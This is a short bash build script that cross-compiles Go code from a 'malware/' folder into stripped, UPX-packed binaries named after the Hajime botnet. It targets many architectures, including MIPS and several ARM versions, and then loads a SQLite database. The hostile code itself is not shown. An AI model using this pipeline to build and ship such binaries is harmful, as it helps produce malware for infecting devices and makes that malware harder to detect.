#!/bin/bash

# Create binaries directory if it doesn't exist
mkdir -p binaries

# List of GOOS and GOARCH combinations
PLATFORMS="darwin/amd64 darwin/arm64 dragonfly/amd64 freebsd/386 freebsd/amd64 freebsd/arm linux/386 linux/amd64 linux/arm linux/arm64 linux/ppc64 linux/ppc64le linux/mips linux/mipsle linux/mips64 linux/mips64le netbsd/386 netbsd/amd64 netbsd/arm openbsd/386 openbsd/amd64 openbsd/arm plan9/386 plan9/amd64 solaris/amd64"

# Go through all combinations
for PLATFORM in $PLATFORMS; do

              # Split the platform into OS and architecture
              GOOS=${PLATFORM%/*}
              GOARCH=${PLATFORM#*/}

              # Name the output file 
              OUTFILE="binaries/Hajime-$GOOS-$GOARCH"
  
              # If the target OS is windows, add .exe to the outfile name
              if [ $GOOS = "windows" ]; then
                            OUTFILE="$OUTFILE.exe"
              fi

              echo "Building for $PLATFORM..."

              # Set the target OS and architecture, build the file
              GOOS=$GOOS GOARCH=$GOARCH go build -ldflags="-s -w" -o $OUTFILE malware/*.go
              upx-ucl -9 $OUTFILE
done

# Build for armv5, armv6 and armv7
for GOARM in 5 6 7; do
              OUTFILE="binaries/Hajime-linux-armv$GOARM"

              echo "Building for linux/armv$GOARM..."

              # Set the target OS, architecture, and ARM version, build the file
              GOOS=linux GOARCH=arm GOARM=$GOARM go build -ldflags="-s -w" -o $OUTFILE malware/*.go
              upx-ucl -9 $OUTFILE
              done

# Run the SQLite3 command
sqlite3 resources/database.sql < hajime-v1.sql

echo "All done."
